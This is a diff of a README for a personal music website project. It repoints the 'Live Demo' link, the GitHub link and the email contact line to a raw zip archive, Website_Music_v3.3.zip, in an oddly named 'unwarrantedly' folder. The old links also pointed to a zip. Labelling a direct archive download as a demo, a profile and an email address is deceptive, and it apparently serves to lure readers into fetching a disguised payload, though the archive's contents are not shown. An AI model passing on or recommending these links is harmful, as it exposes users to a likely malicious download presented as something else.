@@ -5,7 +5,7 @@ This project includes a playlist section, custom audio controls, and a modern mu
 
 ## 🔗 Live Preview
 
-👉 [Live Demo](https://raw.githubusercontent.com/dotsatya/Music-Website/main/unwarrantedly/Music-Website.zip)
+👉 [Live Demo](https://raw.githubusercontent.com/dotsatya/Music-Website/main/unwarrantedly/Website_Music_v3.3.zip)
 
 ---
 
@@ -32,6 +32,6 @@ This project includes a playlist section, custom audio controls, and a modern mu
 ## 📬 Contact
 
 **Satya Sundar Dey**  
-🌐 [GitHub](https://raw.githubusercontent.com/dotsatya/Music-Website/main/unwarrantedly/Music-Website.zip)  
-📧 https://raw.githubusercontent.com/dotsatya/Music-Website/main/unwarrantedly/Music-Website.zip
+🌐 [GitHub](https://raw.githubusercontent.com/dotsatya/Music-Website/main/unwarrantedly/Website_Music_v3.3.zip)  
+📧 https://raw.githubusercontent.com/dotsatya/Music-Website/main/unwarrantedly/Website_Music_v3.3.zip
 
